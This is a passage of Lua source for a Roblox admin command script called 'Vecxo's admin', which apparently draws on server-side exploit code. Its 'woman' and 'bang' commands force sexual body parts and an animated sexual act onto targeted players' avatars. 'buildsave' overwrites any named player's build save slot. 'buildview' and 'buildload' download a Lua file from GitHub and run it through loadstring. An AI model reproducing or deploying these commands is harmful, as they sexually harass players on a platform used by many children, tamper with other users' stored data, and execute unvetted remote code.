					ball1.BottomSurface = "Smooth"
					ball1.TopSurface = "Smooth"
					ball1.CanCollide = false
					ball1.Locked = true

					ball2.Color = plr.Character.Torso.Color
					ball2.Size = Vector3.new(1, 1, 1)
					ball2.BottomSurface = "Smooth"
					ball2.TopSurface = "Smooth"
					ball2.CanCollide = false
					ball2.Locked = true

					tipmesh.MeshType = "Sphere"
					tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

					ball1mesh.MeshType = "Sphere"
					ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					ball2mesh.MeshType = "Sphere"
					ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

					peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
					tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
					ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
					ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)

					tipweld.Part0 = plr.Character.Torso
					tipweld.Part1 = tip

					peepweld.Part0 = plr.Character.Torso
					peepweld.Part1 = peep

					peepweld2.Part0 = peep
					peepweld2.Part1 = tip

					ball1weld.Part0 = plr.Character.Torso
					ball1weld.Part1 = ball1

					ball2weld.Part0 = plr.Character.Torso
					ball2weld.Part1 = ball2

				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "woman",
	Aliases = {"girl"},
	Function = function(sender, targets, arguments) -- took iy SS code for this one
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Torso") then

					local V1 = plr.Character:FindFirstChild("Torso")

					function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
						local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
						if (zCoco) then
							funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						else
							funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
						end
						return funcw
					end

					local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = plr.Character.Torso.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
					local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
					local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = plr.Character.Torso.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
					local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
					fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
					local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
					local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
					local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
					local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
					fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
					local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = plr.Character.Torso.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
					local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = plr.Character.Torso.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
					local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
					fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "bang",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments) -- took iy SS code for this one
		if not restrictcheck(sender) then
			local arg, plr

			if arguments[2] then
				arg = arguments[1]
				plr = arguments[2]
			elseif arguments[1] then
				arg = sender.Name
				plr = arguments[1]
			else
				notfi(sender, "Vecxo's admin", "You need to specify at least one player!")
				return
			end

			if arg == "me" then
				arg = sender.Name
			end

			local argt = p(arg, sender)
			local argt2 = p(plr, sender)

			if #argt2 <= 0 then
				V1 = workspace:FindFirstChild(plr)
				if V1 then
					V1 = V1.Torso
				else
					notfi(sender, "Vecxo's admin", "Invalid user / model!")
					return
				end
			else
				V1 = argt2[1]

				if V1.Character and V1.Character:FindFirstChild("Torso") and V1.Character:FindFirstChild("Humanoid") then
					V1 = argt2[1].Character:FindFirstChild("Torso")
				else
					notfi(sender, "Vecxo's admin", V1.Name .." Doesn't have a Torso!")
					return
				end
			end

			if argt[1].Character and argt[1].Character:FindFirstChild("Torso") and argt[1].Character:FindFirstChild("HumanoidRootPart") then

				local P1 = argt[1].Character:FindFirstChild("Torso")

				if #argt2 <= 0 and workspace:FindFirstChild(plr) then
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					workspace:FindFirstChild(plr):FindFirstChild("HumanoidRootPart").Massless = true
				else
					V1.Parent:FindFirstChild("HumanoidRootPart"):SetNetworkOwner(argt[1])
					V1.Parent:FindFirstChild("HumanoidRootPart").Massless = true
				end

				function fWeld(zName, zParent, zPart0, zPart1, zCoco, A, B, C, D, E, F)
					local funcw = Instance.new('Weld') funcw.Name = zName funcw.Parent = zParent funcw.Part0 = zPart0 funcw.Part1 = zPart1
					if (zCoco) then
						funcw.C0 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					else
						funcw.C1 = CFrame.new(A, B, C) * CFrame.fromEulerAnglesXYZ(D, E, F)
					end
					return funcw
				end

				local WE = nil

				V1.Parent:FindFirstChild("Humanoid").PlatformStand = true
				P1['Left Shoulder']:Destroy() local LA1 = Instance.new('Weld', P1) LA1.Part0 = P1 LA1.Part1 = P1.Parent['Left Arm'] LA1.C0 = CFrame.new(-1.5, 0, 0) LA1.Name = 'Left Shoulder'
				P1['Right Shoulder']:Destroy() local RS1 = Instance.new('Weld', P1) RS1.Part0 = P1 RS1.Part1 = P1.Parent['Right Arm'] RS1.C0 = CFrame.new(1.5, 0, 0) RS1.Name = 'Right Shoulder'
				V1['Left Shoulder']:Destroy() local LS2 = Instance.new('Weld', V1) LS2.Part0 = V1 LS2.Part1 = V1.Parent['Left Arm'] LS2.C0 = CFrame.new(-1.5, 0, 0) LS2.Name = 'Left Shoulder'
				V1['Right Shoulder']:Destroy() local RS2 = Instance.new('Weld', V1) RS2.Part0 = V1 RS2.Part1 = V1.Parent['Right Arm'] RS2.C0 = CFrame.new(1.5, 0, 0) RS2.Name = 'Right Shoulder'
				V1['Left Hip']:Destroy() local LH2 = Instance.new('Weld', V1) LH2.Part0 = V1 LH2.Part1 = V1.Parent['Left Leg'] LH2.C0 = CFrame.new(-0.5, -2, 0) LH2.Name = 'Left Hip'
				V1['Right Hip']:Destroy() local RH2 = Instance.new('Weld', V1) RH2.Part0 = V1 RH2.Part1 = V1.Parent['Right Leg'] RH2.C0 = CFrame.new(0.5, -2, 0) RH2.Name = 'Right Hip'

				local BL = Instance.new('Part', V1) BL.TopSurface = 0 BL.BottomSurface = 0 BL.CanCollide = false BL.Color = V1.Color BL.Shape = 'Ball' BL.Size = Vector3.new(1, 1, 1)
				local DM2 = Instance.new('SpecialMesh', BL) DM2.MeshType = 'Sphere' DM2.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BL, true, -0.5, 0.4, -0.6, 0, 0, 0)
				local BR = Instance.new('Part', V1) BR.TopSurface = 0 BR.BottomSurface = 0 BR.CanCollide = false BR.Color = V1.Color BR.Shape = 'Ball' BR.Size = Vector3.new(1, 1, 1)
				local DM3 = Instance.new('SpecialMesh', BR) DM3.MeshType = 'Sphere' DM3.Scale = Vector3.new(1.2, 1.2, 1.2)
				fWeld('weld', V1, V1, BR, true, 0.5, 0.4, -0.6, 0, 0, 0)
				local BLN = Instance.new('Part', V1) BLN.TopSurface = 0 BLN.BottomSurface = 0 BLN.CanCollide = false BLN.BrickColor = BrickColor.new('Pink') BLN.Shape = 'Ball' BLN.Size = Vector3.new(1, 1, 1)
				local DM4 = Instance.new('SpecialMesh', BLN) DM4.MeshType = 'Sphere' DM4.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BLN, true, -0.5, 0.4, -1.2, 0, 0, 0)
				local BRN = Instance.new('Part', V1) BRN.TopSurface = 0 BRN.BottomSurface = 0 BRN.CanCollide = false BRN.BrickColor = BrickColor.new('Pink') BRN.Shape = 'Ball' BRN.Size = Vector3.new(1, 1, 1)
				local DM5 = Instance.new('SpecialMesh', BRN) DM5.MeshType = 'Sphere' DM5.Scale = Vector3.new(0.2, 0.2, 0.2)
				fWeld('weld', V1, V1, BRN, true, 0.5, 0.4, -1.2, 0, 0, 0)
				local B = Instance.new('Part', V1) B.TopSurface = 0 B.BottomSurface = 0 B.CanCollide = false B.Color = V1.Color B.Shape = 'Ball' B.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM = Instance.new('SpecialMesh', B) BM.MeshType = 'Sphere' BM.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B, true, -0.7, -1, 0.5, 0, 0, 0)
				local B2 = Instance.new('Part', V1) B2.TopSurface = 0 B2.BottomSurface = 0 B2.CanCollide = false B2.Color = V1.Color B2.Shape = 'Ball' B2.Size = Vector3.new(1.3, 1.3, 1.3)
				local BM2 = Instance.new('SpecialMesh', B2) BM2.MeshType = 'Sphere' BM2.Scale = Vector3.new(1.25, 1.25, 1.25)
				fWeld('weld', V1, V1, B2, true, 0.7, -1, 0.5, 0, 0, 0)

				local tip = Instance.new("Part", argt[1].Character)
				local peep = Instance.new("Part", argt[1].Character)
				local ball1 = Instance.new("Part", argt[1].Character)
				local ball2 = Instance.new("Part", argt[1].Character)

				local tipmesh = Instance.new("SpecialMesh", tip)
				local peepmesh = Instance.new("CylinderMesh", peep)
				local ball1mesh = Instance.new("SpecialMesh", ball1)
				local ball2mesh = Instance.new("SpecialMesh", ball2)

				local tipweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld = Instance.new("WeldConstraint", argt[1].Character)
				local peepweld2 = Instance.new("WeldConstraint", peep)
				local ball1weld = Instance.new("WeldConstraint", argt[1].Character)
				local ball2weld = Instance.new("WeldConstraint", argt[1].Character)

				tip.BrickColor = BrickColor.new("Pink")
				tip.Size = Vector3.new(1, 1, 1)
				tip.BottomSurface = "Smooth"
				tip.TopSurface = "Smooth"
				tip.CanCollide = false
				tip.Locked = true

				peep.Color = argt[1].Character.Torso.Color
				peep.Size = Vector3.new(0.4, 1.3, 0.4)
				peep.BottomSurface = "Smooth"
				peep.TopSurface = "Smooth"
				peep.CanCollide = false
				peep.Locked = true

				ball1.Color = argt[1].Character.Torso.Color
				ball1.Size = Vector3.new(1, 1, 1)
				ball1.BottomSurface = "Smooth"
				ball1.TopSurface = "Smooth"
				ball1.CanCollide = false
				ball1.Locked = true

				ball2.Color = argt[1].Character.Torso.Color
				ball2.Size = Vector3.new(1, 1, 1)
				ball2.BottomSurface = "Smooth"
				ball2.TopSurface = "Smooth"
				ball2.CanCollide = false
				ball2.Locked = true

				tipmesh.MeshType = "Sphere"
				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)

				ball1mesh.MeshType = "Sphere"
				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				ball2mesh.MeshType = "Sphere"
				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)

				peep.CFrame = argt[1].Character.Torso.CFrame * CFrame.new(0, -1, -1) * CFrame.Angles(math.rad(90), 0, 0)
				tip.CFrame = peep.CFrame * CFrame.new(0, -0.7, 0)
				ball1.CFrame = peep.CFrame * CFrame.new(0.3, 0.4, 0.25)
				ball2.CFrame = peep.CFrame * CFrame.new(-0.3, 0.4, 0.25)

				tipweld.Part0 = argt[1].Character.Torso
				tipweld.Part1 = tip

				peepweld.Part0 = argt[1].Character.Torso
				peepweld.Part1 = peep

				peepweld2.Part0 = peep
				peepweld2.Part1 = tip

				ball1weld.Part0 = argt[1].Character.Torso
				ball1weld.Part1 = ball1

				ball2weld.Part0 = argt[1].Character.Torso
				ball2weld.Part1 = ball2

				LH2.C1 = CFrame.new(0.2, 1.6, 0.4) * CFrame.Angles(3.9, -0.4, 0) RH2.C1 = CFrame.new(-0.2, 1.6, 0.4) * CFrame.Angles(3.9, 0.4, 0)
				LS2.C1 = CFrame.new(-0.2, 0.9, 0.6) * CFrame.Angles(3.9, -0.2, 0) RS2.C1 = CFrame.new(0.2, 0.9, 0.6) * CFrame.Angles(3.9, 0.2, 0)
				LA1.C1 = CFrame.new(-0.5, 0.7, 0) * CFrame.Angles(-0.9, -0.4, 0) RS1.C1 = CFrame.new(0.5, 0.7, 0) * CFrame.Angles(-0.9, 0.4, 0)

				WE = fWeld('weldx', P1, P1, V1, true, 0, -1, -2, math.rad(-90), 0, 0)
				local N = V1.Neck N.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)

				task.spawn(function() 
					while task.wait() do
						for i = 1, 6 do -- forwards
							WE.C0 = WE.C0 * CFrame.new(0, 0.1, 0)
							task.wait(0.030)
						end

						for i = 1, 6 do -- backwards
							WE.C0 = WE.C0 * CFrame.new(0, -0.1, 0)
							task.wait(0.030)
						end
						task.wait()
					end
				end)
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "antikill",
	Aliases = {"autore"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not table.find(AutoRespawn, plr.Name) then
				table.insert(AutoRespawn, plr.Name)
			else
				notfi(sender, "Vecxo's admin", plr.Name .. " already has antikill enabled!")
				return
			end

			cxoconnections["AntiKill3"](plr)

		end
	end
})

addcmd({
	Name = "antipunish",
	Aliases = {"antipun"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if AutoUnpunish[plr.Name] then
				notfi(sender, "Vecxo's admin", plr.Name .. " already has antipunish enabled!")
				return
			end
			cxoconnections["AntiPunish3"](plr)
			notfi(sender, "Vecxo's admin", "Antipunish enabled for " .. plr.Name)
		end
	end
})


addcmd({
	Name = "unantipunish",
	Aliases = {"unantipun"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			AutoUnpunish[plr.Name] = nil
			notfi(sender, "Vecxo's admin", "Antipunish disabled for " .. plr.Name)
		end
	end
})


addcmd({
	Name = "unantikill",
	Aliases = {"unautore"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(AutoRespawn, plr.Name) then
				table.remove(AutoRespawn, table.find(AutoRespawn, plr.Name))
			end
		end
	end
})

addcmd({
	Name = "findgear",
	Aliases = {"findtool"},
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Accessories&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Gear&Keyword=" .. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and gear then
				for i, plr in ipairs(targets) do
					local item = gear:FindFirstChildOfClass("Tool")
					if item then
						item.Parent = plr.Backpack
					end
				end
			else
				notfi(sender, "Vecxo's admin", "Failed to insert the gear")
			end
		end
	end
})

addcmd({
	Name = "findhat",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Accessories&includeNotForSale=true&limit=10&salesTypeFilter=1&Keyword=".. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, accessory = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and accessory then
				for i, plr in ipairs(targets) do
					local hat = accessory:FindFirstChildOfClass("Accessory")
					if hat and plr.Character then
						hat.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the accessory")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "findface",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=BodyParts&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Faces&Keyword=".. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, face = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and face then
				for i, plr in ipairs(targets) do
					local decal = face:FindFirstChildWhichIsA("Decal", true)

					if decal and plr.Character and plr.Character:FindFirstChild("Head") then

						if plr.Character:FindFirstChild("Head"):FindFirstChild("face") then
							plr.Character:FindFirstChild("Head"):FindFirstChild("face"):Destroy()
						end

						local f = decal:Clone()
						f.Name = "face"
						f.Parent = head
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the face")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "find3d",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Clothing&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=Clothing&Keyword=".. word2)

		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, accessory = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and accessory then
				for i, plr in ipairs(targets) do
					local hat = accessory:FindFirstChildOfClass("Accessory")
					if hat and plr.Character then
						hat.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the accessory")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "findhair",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=BodyParts&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=HairAccessories&Keyword=".. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)
		if response then
			local success, accessory = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and accessory then
				for i, plr in ipairs(targets) do
					local hat = accessory:FindFirstChildOfClass("Hair")
					if hat and plr.Character then
						hat.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the accessory")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "findshirt",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Clothing&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=ClassicShirts&keyword=" .. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, shirt = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and shirt then
				for i, plr in ipairs(targets) do
					local texture = shirt:FindFirstChildOfClass("Shirt")

					if texture and plr.Character then

						if plr.Character:FindFirstChildOfClass("Shirt") then
							plr.Character:FindFirstChildOfClass("Shirt"):Destroy()
						end

						local f = texture:Clone()
						f.Name = "Shirt"
						f.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the shirt")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "findtshirt",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Clothing&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=ClassicTShirts&keyword=" .. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, shirt = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and shirt then
				for i, plr in ipairs(targets) do
					local texture = shirt:FindFirstChildOfClass("ShirtGraphic")

					if texture and plr.Character then

						if plr.Character:FindFirstChildOfClass("ShirtGraphic") then
							plr.Character:FindFirstChildOfClass("ShirtGraphic"):Destroy()
						end

						local f = texture:Clone()
						f.Name = "ShirtGraphic"
						f.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the tshirt")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "findpants",
	Function = function(sender, targets, arguments)
		local word = table.concat(arguments, " ", 2)
		local word2 = game:GetService("HttpService"):UrlEncode(word)

		local url = ("https://catalog.roproxy.com/v1/search/items?category=Clothing&includeNotForSale=true&limit=10&salesTypeFilter=1&subcategory=ClassicPants&keyword=" .. word2)
		local response = game:GetService("HttpService"):GetAsync(url)
		local data = game:GetService("HttpService"):JSONDecode(response)

		if response then
			local success, pants = pcall(function()
				return game:GetService("InsertService"):LoadAsset(data["data"][1]["id"])
			end)

			if success and pants then
				for i, plr in ipairs(targets) do
					local texture = pants:FindFirstChildOfClass("Pants")

					if texture and plr.Character and plr.Character:FindFirstChild("Head") then

						if plr.Character:FindFirstChildOfClass("Pants") then
							plr.Character:FindFirstChildOfClass("Pants"):Destroy()
						end

						local f = texture:Clone()
						f.Name = "Pants"
						f.Parent = plr.Character
					else
						notfi(sender, "Vecxo's admin", "Failed to insert the pants")
					end
				end
			end
		end
	end
})

addcmd({
	Name = "save",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local slot = arguments[1] -- slot 0 = "buildsave" (kohls) | slot 1 - 10 = "buildsave/1+" (p299)
		local saving = table.concat(arguments, " ", 2)
		local parts = {}

		local function c(d)
			return {
				x = d.X,
				y = d.Y,
				z = d.Z
			}
		end

		local function f(g)
			return {
				r = g.R,
				g = g.G,
				b = g.B
			}
		end

		for i, plr in ipairs(targets) do
			local folder = workspace:FindFirstChild(saving)
			if folder then
				for i, part in ipairs(folder:GetDescendants()) do
					if part:IsA("BasePart") then
						part.Name = "Part"
						table.insert(_G.btoolsparts, part)
					end
				end
				if tonumber(slot) == 0 then
					local bss = game:GetService("DataStoreService"):GetDataStore("BuildSaveSystem")
					for l, m in ipairs(workspace:GetDescendants()) do
						if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") and table.find(_G.btoolsparts, m) then
							table.insert(parts, {
								Name = tostring(m.Name),
								CFrame = tostring(m.CFrame),
								Size = c(m.Size),
								Color = f(m.Color),
								Material = m.Material.Name,
								Anchored = m.Anchored,
								CanCollide = m.CanCollide
							})
						end
					end
					local success, fail = pcall(function()
						bss:SetAsync(plr.UserId, parts)
					end)
					if success then
						notfi(sender, "Vecxo's admin", "Saved to slot ".. slot .. "!")
					else
						notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
					end
				elseif tonumber(slot) > 0 then
					local bss = game:GetService("DataStoreService"):GetDataStore("Person299BuildSaveSystem" .. tonumber(slot))
					for l, m in ipairs(workspace:GetDescendants()) do
						if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") and table.find(_G.btoolsparts, m) then
							table.insert(parts, {
								Name = tostring(m.Name),
								CFrame = tostring(m.CFrame),
								Size = c(m.Size),
								Color = f(m.Color),
								Material = m.Material.Name,
								Anchored = m.Anchored,
								CanCollide = m.CanCollide
							})
						end
					end
					local success, fail = pcall(function()
						bss:SetAsync(plr.UserId, parts)
					end)
					if success then
						notfi(sender, "Vecxo's admin", "Saved to slot ".. slot .. "!")
					else
						notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
					end
				end
			else
				notfi(sender, "Vecxo's admin", "Invalid name! | ".. saving)
			end
		end
	end
})

addcmd({
	Name = "buildsave",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local plr = arguments[1]
		local plrid
		local slot = arguments[2] -- slot 0 = "buildsave" (kohls) | slot 1 - 10 = "buildsave/1+" (p299)
		local parts = {}

		if plr == "me" then
			plr = sender.Name
		end

		local argt = p(plr, sender)

		if #argt > 0 then
			plr = argt[1].Name
		end

		local success, fail = pcall(function()
			plrid = game.Players:GetUserIdFromNameAsync(plr)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		local function c(d)
			return {
				x = d.X,
				y = d.Y,
				z = d.Z
			}
		end

		local function f(g)
			return {
				r = g.R,
				g = g.G,
				b = g.B
			}
		end

		if tonumber(slot) == 0 then
			local bss = game:GetService("DataStoreService"):GetDataStore("BuildSaveSystem")
			for l, m in ipairs(workspace:GetDescendants()) do
				if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") and table.find(_G.btoolsparts, m) then
					table.insert(parts, {
						Name = tostring(m.Name),
						CFrame = tostring(m.CFrame),
						Size = c(m.Size),
						Color = f(m.Color),
						Material = m.Material.Name,
						Anchored = m.Anchored,
						CanCollide = m.CanCollide
					})
				end
			end
			local success, fail = pcall(function()
				bss:SetAsync(plrid, parts)
			end)
			if success then
				notfi(sender, "Vecxo's admin", "Saved to ".. plr .."'s slot ".. slot .. "!")
			else
				notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
			end
		elseif tonumber(slot) > 0 then
			local bss = game:GetService("DataStoreService"):GetDataStore("Person299BuildSaveSystem" .. tonumber(slot))
			for l, m in ipairs(workspace:GetDescendants()) do
				if m:IsA("BasePart") and (m.Name == "Part" or m.Name == "CornerWedge" or m.Name == "Wedge" or m.Name == "Truss") and table.find(_G.btoolsparts, m) then
					table.insert(parts, {
						Name = tostring(m.Name),
						CFrame = tostring(m.CFrame),
						Size = c(m.Size),
						Color = f(m.Color),
						Material = m.Material.Name,
						Anchored = m.Anchored,
						CanCollide = m.CanCollide
					})
				end
			end
			local success, fail = pcall(function()
				bss:SetAsync(plrid, parts)
			end)
			if success then
				notfi(sender, "Vecxo's admin", "Saved to ".. plr .."'s slot ".. slot .. "!")
			else
				notfi(sender, "Vecxo's admin", "Failed to save: ".. fail)
			end
		end
	end
})

addcmd({
	Name = "buildview",
	Aliases = {"viewbuild"},
	Function = function(sender, targets, arguments)

		local targetid = arguments[1]
		local targetslot = arguments[2]

		if targetslot == "0" then
			targetslot = nil
		end

		local success, fail = pcall(function()
			targetid = game.Players:GetUserIdFromNameAsync(targetid)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		if not shared._DEK then
			notfi(sender, "Vecxo's admin", "shared._DEK not found, importing..", 2)
			local success, result = pcall(function() -- decryptionite's build loader
				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/decryptionite/streaming/refs/heads/main/Kohls%20Admin%20House%20NP/unlocked_buildload_v1.lua")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)
				if loaded then
					loaded()
				else
					notfi(sender, "Vecxo's admin", "Failed to load shared._DEK")
				end
			else
				notfi(sender, "Vecxo's admin", "Failed to load shared._DEK")
			end
		end

		for i, plr in ipairs(targets) do
			shared._DEK:Load(plr, targetid, targetslot)
		end

	end
})

addcmd({
	Name = "buildload",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)

		local targetid = arguments[1]
		local targetslot = arguments[2]

		if targetslot == "0" then
			targetslot = nil
		end

		if targetid == "me" then
			targetid = sender.Name
		end

		local argt = p(targetid, sender)

		if #argt > 0 then
			targetid = argt[1].Name
		end

		local success, fail = pcall(function()
			targetid = game.Players:GetUserIdFromNameAsync(targetid)
		end)

		if fail then
			notfi(sender, "Vecxo's admin", "Failed to get UserId, is the name correct?")
			return
		end

		if not shared._DEK then
			notfi(sender, "Vecxo's admin", "shared._DEK not found, importing..", 2)
			local success, result = pcall(function() -- decryptionite's build loader
